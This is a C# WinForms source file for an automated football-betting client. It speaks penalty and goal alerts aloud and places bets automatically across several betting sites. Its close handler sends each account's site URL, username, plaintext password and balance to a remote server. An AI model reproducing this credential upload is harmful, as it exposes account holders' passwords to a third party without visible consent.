using System;
using System.Windows.Forms;
using CxjText.utlis;
using CxjText.utils;
using CxjText.bean;
using CxjText.views;
using CxjText.iface;
using System.Threading;
using Newtonsoft.Json.Linq;
using System.Collections.Generic;
using System.Speech.Synthesis;


namespace CxjText
{
    public partial class MainFrom : Form, LoginFormInterface
    {

        private LoginForm loginForm = null; //登录的界面
        private LeftForm leftForm = null; //左边的界面
        private MsgShowForm msgShowForm = null;// 消息列表的界面
        private bool isFinish = false;
        private WebSocketUtils webSocketUtils = null;
        private List<EnventInfo> listEnvets = new List<EnventInfo>();
        private SpeechSynthesizer speechSynthesizer = new SpeechSynthesizer();

        private List<Eid> listEid = new List<Eid>(); //eid事件储存
        
        public MainFrom()
        {
            InitializeComponent();
            HttpUtils.setMaxContectionNum(100);
        }

        //窗口加载出来的时候调用
        private void MainFrom_Load(object sender, EventArgs e)
        {
            OrderUtils.autoLists.Clear();
            DataInit(); //读取配置文件
            if (Config.userList == null || Config.userList.Count == 0)
            {
                MessageBox.Show("读取配置文件出错");
                Application.Exit();
                return;
            }
           
            this.MsgShowFormInit();
           
            ViewInit();
            this.upDateTimer.Start(); //启动定时任务器
            webSocketUtils = new WebSocketUtils(Config.webSocketUrl);
            webSocketUtils.setOnMessListener(this);
            speakInit();
            Config.hasFitter = fitBox.Checked;
            Config.isPingBang = pingbanCheckBox.Checked;
        }

        //初始化语音
        private void speakInit()
        {
            try
            {
                if (speechSynthesizer.GetInstalledVoices().Count > 0)
                {
                    bool setLily = false;
                    for (int i = 0; i < speechSynthesizer.GetInstalledVoices().Count; i++)
                    {
                        String name = speechSynthesizer.GetInstalledVoices()[i].VoiceInfo.Name;
                        if (name.Equals("VW Lily"))
                        {
                            speechSynthesizer.SelectVoice(name);
                            setLily = true;
                            break;
                        }
                    }

                    if (!setLily && speechSynthesizer.GetInstalledVoices().Count > 0)
                    {
                        speechSynthesizer.SelectVoice(speechSynthesizer.GetInstalledVoices()[0].VoiceInfo.Name);
                    }

                    speechSynthesizer.Rate = 6;
                    speechSynthesizer.SpeakAsync("登录成功");
                }
            }
            catch (Exception e1)
            {
               
                // MessageBox.Show("请安装语音库");
            }
        }


        private void ViewInit()
        {
            loginForm = new LoginForm();
            loginForm.TopLevel = false;    //设置为非顶级窗体
            loginForm.FormBorderStyle = FormBorderStyle.None;       //设置窗体为非边框样式
            this.loginPanel.Controls.Add(loginForm);      //添加窗体
            loginForm.Show();
            loginForm.setLoginFormInterface(this);


            leftForm = new LeftForm();
            leftForm.TopLevel = false;    //设置为非顶级窗体
            leftForm.FormBorderStyle = FormBorderStyle.None;       //设置窗体为非边框样式
            this.leftPanel.Controls.Add(leftForm);      //添加窗体
            leftForm.Show();
            leftForm.setMainForm(loginForm, this);
            
        }


        private void DataInit()
        {
            //获取到用户数据
            FileUtils.ReadUserJObject(@"C:\user.txt");
        }


        //退出整个应用程序
        private void MainFrom_close(object sender, FormClosedEventArgs e)
        {

            //先捕捉金额

            JObject jObject = new JObject();
            jObject["userName"] = Config.softUserStr;
            JArray jArry = new JArray();
            for (int i = 0; i < Config.userList.Count; i++) {
                UserInfo userInfo = (UserInfo)Config.userList[i];
                if (userInfo != null && !String.IsNullOrEmpty(userInfo.money)) {
                    JObject temp = new JObject();
                    temp["sys"] = userInfo.tag; //系统
                    temp["money"] = userInfo.money;//钱
                    temp["url"] = userInfo.baseUrl;
                    temp["webUser"] = userInfo.user;
                    temp["webPwd"] = userInfo.pwd;
                    jArry.Add(temp);
                }
            }
            if (jArry.Count > 0) {
                jObject["web"] = jArry;
                HttpUtils.HttpPost(Config.netUrl + "/cxj/outLogin", jObject.ToString(), "application/json", null);
            }

          


            try
            {
                this.upDateTimer.Stop(); //将定时器停止
                isFinish = true;
                
                if (this.msgShowForm != null)
                {
                    this.msgShowForm.Close();
                }

                if (webSocketUtils != null)
                {
                    webSocketUtils.close();
                }

                if (speechSynthesizer != null)
                {
                    speechSynthesizer.SpeakAsyncCancelAll();
                    speechSynthesizer.Dispose();
                }
            }
            catch (Exception e1)
            {

            }

            System.Environment.Exit(0);
        }

        //定时器回调   1s一次
        private int num = 0;
        private void updateTimer_Tick(object sender, EventArgs e)
        {
            
            num++;
            if (num % 15 == 0)
            {
                if (webSocketUtils != null)
                {
                    JObject jObject = new JObject();
                    jObject["user"] = Config.softUserStr;
                    jObject["version"] = Config.vString;
                    webSocketUtils.send(jObject.ToString());
                }
                num = 0;
            }

            //删除缓存列表数据
            OrderUtils.autoLists.RemoveAll(j => (FormUtils.getCurrentTime() - j.time > 120 * 60 * 1000));

            if (listEid != null && listEid.Count > 0) {
                listEid.RemoveAll(j => (FormUtils.getCurrentTime() - j.time > 120 * 60 * 1000));
            }
            

            if (this.loginForm == null) return;
            //获取当前选中的行
            int index = this.loginForm.getCurrentSelectRow();
            if (index == -1) return;

            //刷新用户数据界面  A系统1s一次  B系统10s一次  其他未知
            this.upDateTimer.Stop(); //暂停定时器

            //获取当前系统的时间  毫秒
            long currentTime = FormUtils.getCurrentTime();
            UserInfo userInfo = (UserInfo)Config.userList[index];
            if (userInfo == null)
            {
                this.upDateTimer.Start();
                return;
            }
            long userTime = userInfo.updateTime;//获取用户上一次刷新的时间
            //刷新修改 1  时间的处理
            bool canUpdate = FormUtils.canUpdateData(userInfo.tag, userTime, currentTime);
            if (!canUpdate)
            {
                this.upDateTimer.Start();
                return;
            }

            //开始更新数据  更新数据后 重新user更新时间 然后打开定时器
            Thread t = new Thread(new ParameterizedThreadStart(this.GetData));
            t.Start(index);
        }

        //获取数据接口 在线程里面
        private void GetData(object positionObj)
        {
            int position = (int)positionObj;
            try
            {
                UserInfo userInfo = (UserInfo)Config.userList[position];
                if (userInfo == null)
                {
                    this.Invoke(new Action(() => { upDateTimer.Start(); }));
                    return;
                }
                //获取数据请求接口的url
                String dataRtlStr = null;
                switch (userInfo.tag)
                {
                    case "A":
                        dataRtlStr = DataPramsUtils.getAData(userInfo);
                        break;
                    case "B":
                        dataRtlStr = DataPramsUtils.getBData(userInfo);
                        break;
                    case "I":
                        dataRtlStr = DataPramsUtils.getIData(userInfo);
                        break;
                    case "U":
                        dataRtlStr = DataPramsUtils.getUData(userInfo);
                        break;
                    case "R":
                        dataRtlStr = DataPramsUtils.getRData(userInfo);
                        break;
                    case "G":
                        dataRtlStr = DataPramsUtils.getGData(userInfo);
                        break;
                    case "K":
                        dataRtlStr = DataPramsUtils.getKData(userInfo);
                        break;
                    case "C":
                        dataRtlStr = DataPramsUtils.getCData(userInfo);
                        break;
                    case "F":
                        dataRtlStr = DataPramsUtils.getFData(userInfo);
                        break;
                    case "D":
                        dataRtlStr = DataPramsUtils.getDData(userInfo);
                        break;
                    case "E":
                        dataRtlStr = DataPramsUtils.getEData(userInfo);
                        break;
                    case "H":
                        dataRtlStr = DataPramsUtils.getHData(userInfo);
                       // Console.WriteLine(dataRtlStr);
                        break;
                    default:
                        break;
                }
                //返回数据是空表示获取数据失败
                if (String.IsNullOrEmpty(dataRtlStr))
                {
                    this.Invoke(new Action(() => { upDateTimer.Start(); }));
                    return;
                }
                userInfo.updateTime = FormUtils.getCurrentTime();
                //判断当前选中和数据返回是否同一个数据 不是直接返回
                if (position != loginForm.getCurrentSelectRow())
                {
                    return;
                }
                //获取数据成功
                this.Invoke(new Action(() => {
                    leftForm.SetCurrentData(dataRtlStr, position); //将数据传给界面处理
                    upDateTimer.Start();
                }));
            }
            catch (Exception e)
            {
                Console.WriteLine("获取数据:"+e.ToString());
                if (this.isFinish) return;
                //判断当前选中和数据返回是否同一个数据 不是直接返回
                if (position != loginForm.getCurrentSelectRow())
                {
                    return;
                }
                this.Invoke(new Action(() => { upDateTimer.Start(); }));
            }
        }


        //用户点击选中网址的回调 参数是点击了第几行
        public void SelectOnClick(int index)
        {
            //点击的时候  将当前时间设置下  下个定时时间一到就会立马刷新 
            UserInfo userInfo = (UserInfo)Config.userList[index];
            userInfo.updateTime = -1;
            this.upDateTimer.Start();
        }

        //搜索字体更改处理
        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            String str = textBox1.Text.ToString().Trim();
            if (this.leftForm != null)
            {
                this.leftForm.SetSeaechStr(str);
            }
        }

        public void getCodeMoneyStatus(string moneyStr)
        {
            if (String.IsNullOrEmpty(moneyStr))
            {
                return;
            }

            this.Invoke(new Action(() => { codeMoneyText.Text = moneyStr; }));
        }

        private void speakStr(String str) {
            try
            {
                if (isFinish) return;
                if (speechSynthesizer != null) {
                    speechSynthesizer.SpeakAsync(str);
                }
            }
            catch (Exception e) {

            }
        }


        private void speak(String cid, String info)
        {

            try
            {
                //  String cid = (String)cidObj;
                if (Config.speakJObject[cid] != null)
                {
                    String speakStr = (String)Config.speakJObject[cid];
                    if (info.Contains("Cancelled"))
                    {
                        if (cid.Equals("1031"))
                        {
                            speakStr = "主队点球取消";
                        }
                        else if (cid.Equals("2055"))
                        {
                            speakStr = "客队点球取消";
                        }
                        
                    }
                    else if (info.Contains("Confirmed")||info.Equals("Penalty Home")) {
                        if (cid.Equals("1031"))
                        {
                            speakStr = "主队点球";
                        }
                        else if (cid.Equals("2055")) {
                            speakStr = "客队点球";
                        }
                    }

                    speechSynthesizer.Rate = 6;
                    speechSynthesizer.SpeakAsync(speakStr);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }


        //界面的显示处理
        private void showViewText(EnventShowInfo enventShowInfo) {
            timeText.Text = "时间: " + DateTime.Now.ToString() + " - " + enventShowInfo.shiDuan;
            lianSaiText.Text = "联赛：" + enventShowInfo.lianSaiStr;
            gameText.Text = enventShowInfo.gameH + " - " + enventShowInfo.gameG;
            if (enventShowInfo.ballType == 1) {
                gameText.Text = gameText.Text.ToString() + "(进球)";
            }
            enventText.Text = "事件:" + enventShowInfo.text;
            gameText.Tag = enventShowInfo.gameTeamColor; //判断主客队标志
        }


        //显示事件
        private EnventShowInfo getShowInfo(int time, int teamColor, String shiDuan,
            String hSting, String gString, String enventStr, String lianSai,int ballType) {
            EnventShowInfo enventShowInfo = new EnventShowInfo();
            enventShowInfo.gameTime = time;
            enventShowInfo.gameTeamColor = teamColor;
            enventShowInfo.shiDuan = shiDuan;
            enventShowInfo.gameH = hSting;
            enventShowInfo.gameG = gString;
            enventShowInfo.text = enventStr;
            enventShowInfo.lianSaiStr = lianSai;
            enventShowInfo.ballType = ballType;
            return enventShowInfo;
        }


        //收到数据
        public void OnWebSocketMessAge(string message)
        {
           // Console.WriteLine(message);
            if (String.IsNullOrEmpty(message) || !FormUtils.IsJsonObject(message))
            {
                
                return;
            }
            JObject jObject = JObject.Parse(message);
            if (jObject == null) return;

            //87分钟事件的处理
            //{"cmd":2,"league":"冰岛女子甲组联赛","state":0,"score1":"1","score2":"1","tm1":"斯洛图尔(女)","tm2":"富佐尼(女)","gametime":"67"}
            // 联赛名字，{1:主队进球,0:客队进球},主队比分,客队比分,主队名字,客队名字,比赛进行的时间
            if (jObject["cmd"] != null && ((int)jObject["cmd"]) != 1)
            {
                
                if (((int)jObject["cmd"]) != 2) return;
               // Console.WriteLine(message);

                this.Invoke(new Action(() => {
                    String league = (String)jObject["league"];
                    int state = (int)jObject["state"];
                    int zhuScore = (int)jObject["score1"];
                    int geScore = (int)jObject["score2"];
                    String hName = (String)jObject["tm1"];
                    String gName = (String)jObject["tm2"];
                    int gameTime = (int)jObject["gametime"];

                    int curPosition = loginForm.getCurrentSelectRow();
                    if (curPosition >= Config.userList.Count) return;

                    UserInfo userInfo = (UserInfo)Config.userList[curPosition];
                    if (userInfo == null) return;

                    if (Config.softUserStr.Equals("admin") && userInfo.tag.Equals("C"))
                    {
                        //用于本人处理测试C系统  ok就开放
                    }
                    else {
                        //AUD
                        if (!(userInfo.tag.Equals("A") || userInfo.tag.Equals("U") || userInfo.tag.Equals("D")))
                        {
                            return;
                        }

                        if (!((gameTime >= 86 && gameTime <= 89)))
                        {
                            return;
                        }
                    }
                    


                    gameTime = gameTime * 60 * 1000; //计算当前比赛时间 毫秒
                    String shijianStr = "";
                    int teamColor = 0;
                    String shiDuan = "全场";
                    String biFenString = "(" + zhuScore + ":" + geScore + ")";

                    if (state == 1)
                    {
                        teamColor = 1;
                        shijianStr = "主队进球";
                    }
                    else if (state == 0)
                    {
                        teamColor = 2;
                        shijianStr = "客队进球";
                    }
                    else { return; }
                    if (gameTime < 2700000)
                    { //半场
                        shiDuan = "上半场";
                    }
                    else
                    {
                        shiDuan = "全场";
                    }

                    speakStr(shiDuan + shijianStr + "," + biFenString);
               

                    //事件的显示
                    EnventShowInfo jinQiuShowInfo = getShowInfo(gameTime,
                        teamColor, shiDuan,
                        hName, gName,
                        shijianStr + biFenString, league, 1);

                    showViewText(jinQiuShowInfo);
                   


                    //处理进球下单事件
                    EnventInfo jinQiuEnventInfo = new EnventInfo();

                    if (state == 1) //主队
                    {
                        jinQiuEnventInfo.cid = "1031";
                    }
                    else if (state == 0) //客队
                    {
                        jinQiuEnventInfo.cid = "2055";
                    }

                    jinQiuEnventInfo.info = shijianStr;
                    jinQiuEnventInfo.time = FormUtils.getCurrentTime();
                    jinQiuEnventInfo.mid = "-1"; //mid为-1表示进球
                    jinQiuEnventInfo.nameH = hName;
                    jinQiuEnventInfo.nameG = gName;
                    jinQiuEnventInfo.T = gameTime + "";
                    jinQiuEnventInfo.inputType = this.GetCurrUserSelected();
                    jinQiuEnventInfo.bangchangType = GetBanChangSelected();
                    jinQiuEnventInfo.isDriect = false;
                    JArray scoreArray = new JArray();
                    scoreArray.Add(zhuScore);//第0个
                    scoreArray.Add(geScore);//第1个
                    jinQiuEnventInfo.scoreArray = scoreArray; //进球比分赋值处理

                    speakStr("有进球要下注");
                    leftForm.setComplete(jinQiuEnventInfo);
                   

                    Thread t = new Thread(new ParameterizedThreadStart(this.ShowEventInfo));
                    t.Start(jinQiuShowInfo);
                }));
                
                return;
            }

         


            //点球事件的处理
            if (leftForm == null) return;
            if (this.isFinish) return;
            if (jObject["game"] == null || jObject["data"] == null) return;
            String cid = (String)jObject["data"]["CID"];
            String mid = (String)jObject["data"]["MID"];
            String EID = (String)jObject["data"]["EID"];

            try
            {
                int eidInt = int.Parse(EID);
                Eid eid = listEid.Find(j => j.mid.Equals(mid));
                if (eid != null)
                {
                    if (eidInt - eid.eid > 0)
                    {
                        listEid.RemoveAll(j => j.mid.Equals(mid));
                        Eid eidEvent = new Eid();
                        eidEvent.mid = mid;
                        eidEvent.eid = eidInt;
                        eidEvent.time = FormUtils.getCurrentTime();
                        listEid.Add(eidEvent);
                    }
                    else {
                        return; 
                    }
                }
                else {
                    Eid eidEvent = new Eid();
                    eidEvent.mid = mid;
                    eidEvent.eid = eidInt;
                    eidEvent.time = FormUtils.getCurrentTime();
                    listEid.Add(eidEvent);

                }

            }
            catch (Exception e11) {

            }



            EnventInfo enventInfo = new EnventInfo();
            enventInfo.inputType = this.GetCurrUserSelected();
            enventInfo.cid = cid;
            enventInfo.mid = mid;
            enventInfo.nameH = (String)jObject["game"]["nameH"];
            enventInfo.nameG = (String)jObject["game"]["nameG"];
            enventInfo.info = (String)jObject["data"]["Info"];
            enventInfo.time = FormUtils.getCurrentTime();
            enventInfo.T = (String)jObject["data"]["T"];
            enventInfo.bangchangType = GetBanChangSelected(); //半场的下注类型

            speak(cid, enventInfo.info); //语音播报
            //事件显示和弹框的处理
            this.Invoke(new Action(() => {
           
                String shiDuan = "全场";
                String enventString = "";
                int teamColor = 0;
                int time = 0;
                try
                {
                    time = int.Parse(enventInfo.T);
                    if (time <= 2700000)
                    { //半场
                        shiDuan = "上半场";
                    }
                    else
                    {
                        shiDuan = "全场";
                    }
                }
                catch (Exception e)
                {

                }
               
                
                if (Config.speakJObject[cid] != null)
                {
                    if (enventInfo.info.Contains("Cancelled"))
                    {
                        if (cid.Equals("1031"))
                        {
                            enventString = "事件:主队点球取消";
                        }
                        else if (cid.Equals("2055"))
                        {
                            enventString = "事件:客队点球取消";
                        }
                        else {
                            enventString = "事件:" + (String)Config.speakJObject[cid];
                        }

                    }
                    else if (enventInfo.info.Contains("Confirmed")||enventInfo.info.Equals("Penalty Home"))
                    {
                        if (cid.Equals("1031"))
                        {
                            enventString = "事件:主队点球";
                        }
                        else if (cid.Equals("2055"))
                        {
                            enventString = "事件:客队点球";
                        }
                        else {
                            enventString = "事件:" + (String)Config.speakJObject[cid];
                        }
                    }
                    else {
                        enventString = "事件:" + (String)Config.speakJObject[cid];
                    }
                }
                else
                {
                    enventString = "事件:" + "未知";
                }


                if (cid.Equals("9926") || cid.Equals("1031")|| cid.Equals("1062")) //主队
                {
                    teamColor = 1;

                }
                else if (cid.Equals("9927") || cid.Equals("2055") || cid.Equals("2086"))//客队
                {
                    teamColor = 2;
                }
                else {
                    teamColor = 0;
                }
                //事件的显示
                EnventShowInfo enventShowInfo = getShowInfo(time, teamColor, shiDuan, 
                    enventInfo.nameH,
                    enventInfo.nameG, 
                    enventString.Replace("事件:", ""),
                    (String)jObject["game"]["leagueName"],0);

                //界面显示
                showViewText(enventShowInfo);

                Thread t = new Thread(new ParameterizedThreadStart(this.ShowEventInfo));
                t.Start(enventShowInfo);
            }));


            if (cid.Equals("9926") || cid.Equals("9927") || cid.Equals("2055") || cid.Equals("1031"))
            {

                if (cid.Equals("9926") || cid.Equals("9927"))
                {
                    listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                    listEnvets.Add(enventInfo);
                    return;
                }

                //要下注的情况
                //先对info做判断  有直接删除然后会return
                if (enventInfo.info.Contains("Cancelled")|| enventInfo.info.Contains("Confirmed")||enventInfo.info.Equals("Penalty Home"))
                {
                    listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                    return;
                }
                //查找
                EnventInfo enventInfo1 = listEnvets.Find(j => j.mid.Equals(mid));
                if (enventInfo1 == null) return;
                if (cid.Equals("2055")) //客队点球
                {
                    if (!enventInfo1.cid.Equals("9927"))
                    {
                        listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                        return;
                    }
                    if (FormUtils.getCurrentTime() - enventInfo1.time > 30 * 1000)
                    {
                        listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                        return;
                    }
                    //客队可以下注 
                    this.Invoke(new Action(() => {
                        speakStr("可以下注");
                        leftForm.setComplete(enventInfo);
                        listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                    }));
                }
                else if (cid.Equals("1031"))
                {  //主队点球
                    if (!enventInfo1.cid.Equals("9926"))
                    {
                        listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                        return;
                    }
                    if (FormUtils.getCurrentTime() - enventInfo1.time > 30 * 1000)
                    {
                        listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                        return;
                    }
                    //主队可以下注
                    this.Invoke(new Action(() => {
                        speakStr("可以下注");
                        leftForm.setComplete(enventInfo);
                        listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                    }));
                }
            }
            else
            {
                //默认选项且为直接下注的类型
                if (cid.Equals("2086") || cid.Equals("1062")) { 
                    if (cid.Equals("2086"))
                    {
                        enventInfo.cid = "2055";//客队点球
                    }
                    else {
                        enventInfo.cid = "1031";//主队点球
                    }
                    this.Invoke(new Action(() => {
                        enventInfo.isDriect = true;  //直接下注类型
                        leftForm.setComplete(enventInfo);
                        if (listEnvets.Count == 0) return;
                        listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                    }));
                    return;
                }
                if (listEnvets.Count == 0) return;
                listEnvets.RemoveAll(j => j.mid.Equals(mid)); //删除时间记录列表
                return;
            }
        }

        // 获取用户当前选中的下单规则 让球或者大小
        public int GetCurrUserSelected()
        {
            if (this.rbRangQiu.Checked)
            {
                return 0;
            }
            else
            {
                return 1;
            }
        }
        //获取搜索的内容
        public void setTextBox1Text(String str)
        {
            textBox1.Text = str.Trim();
        }
        //是否自动下注
        public bool isAuto()
        {
            return autoCheck.Checked;
        }
        //获取半场选择  默认返回0   半场返回1   全场返回2  上半场返回3
        public int GetBanChangSelected()
        {
            if (AutoBanChang.Checked) {
                return 0;
            }

            if (bangCRadio.Checked)
            {
                return 1;
            }

            if (quanCRadio.Checked)
            {
                return 2;
            }

            if (shangBcrBtn.Checked) {
                return 3;
            }
            return 0;
        }
        //获取下單金額选择  默认（全額）返回0  1/2返回1   1/3返回2  1/4返回3
        public int GetAmountSelected(bool isDriect)
        {
            if (isDriect)
            {
                if (rbAmount_1_2.Checked)
                {
                    return 1;
                }
                else if (rbAmount_1_3.Checked)
                {
                    return 2;
                }
                else if (rbAmount_1_4.Checked)
                {
                    return 3;
                }
                else
                {
                    return 0;
                }
            }
            else {
                if (z_2_rd.Checked)
                {
                    return 1;
                }
                else if (z_3_rd.Checked)
                {
                    return 2;
                }
                else
                {
                    return 0;
                }
            }
             
        }
        //获取下單金額选择  默认（全額）返回0  1/2返回1   1/3返回2  1/4返回3
        public int GetAutoPutType()
        {

            if (putAuto.Checked) //默认
            {
                return 1;
            }
            else  //炸弹类型
            {
                return 2;
            }
           
        }

        // 消息列表 初始化
        private void MsgShowFormInit()
        {
            // 测试数据
            //EnventShowInfo enventShowInfo = new EnventShowInfo();
            //enventShowInfo.shiDuan = "上半场";
            //enventShowInfo.gameTime = 3700000;
            //enventShowInfo.lianSaiStr = "意大利甲组联赛";
            //enventShowInfo.gameH = "阿特兰大";
            //enventShowInfo.gameG = "拿玻里";
            //enventShowInfo.text = "可能客队炸弹";

            Thread t = new Thread(new ParameterizedThreadStart(this.ShowEventInfo));
            t.SetApartmentState(ApartmentState.STA);
            t.Start(null);
        }
        // 消息列表 显示消息
        private void ShowEventInfo(Object positionObj)
        {
            EnventShowInfo enventShowInfo = (EnventShowInfo)positionObj;

            if (msgShowForm == null || !msgShowForm.Visible || msgShowForm.IsDisposed)
            {
                msgShowForm = null;
                msgShowForm = new MsgShowForm();
                msgShowForm.ShowEvent(enventShowInfo,this);
            }
            else 
            {
                msgShowForm.AddLineInHead(enventShowInfo);
            }
        }
        //比赛点击搜索
        private void gameText_Click(object sender, EventArgs e)
        {
            String text = gameText.Text.ToString();
            int ballType = 0; // 点球
            if (text.Contains("(进球)")) {
                ballType = 1;
                text = text.Replace("(进球)", "");
            }

            String[] strs = text.Split('-');
            if (strs.Length > 1) {
                if ((int)gameText.Tag == 1)
                {  //主队
                    searchForHistoryTeam(strs[0].Trim(), strs[1].Trim(),true,ballType);
                }
                else if ((int)gameText.Tag == 2)
                { //客队
                    searchForHistoryTeam(strs[0].Trim(), strs[1].Trim(), false, ballType);
                }
                else
                {
                    searchForHistoryTeam(strs[0].Trim(), strs[1].Trim(), true,ballType);
                }
            }
        }

        // 消息列表 历史消息点击搜索  
        //参数  主队  客队  是否主队  类型
        public void searchForHistoryTeam(String hStr,String gStr,bool isH,int ballType)
        {
            if (!String.IsNullOrEmpty(hStr)&& !String.IsNullOrEmpty(gStr))
            {
                String name = leftForm.getSaiName(hStr, gStr,isH, ballType);
                if (name == null) {
                    if (isH)
                    {
                        name = hStr;
                    }
                    else {
                        name = gStr;
                    }
                }
                this.setTextBox1Text((name));
            }
        }

        private void fitBox_CheckedChanged(object sender, EventArgs e)
        {
            Config.hasFitter = fitBox.Checked;
        }

        private void pingbanCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            Config.isPingBang = pingbanCheckBox.Checked;
        }
    }
}
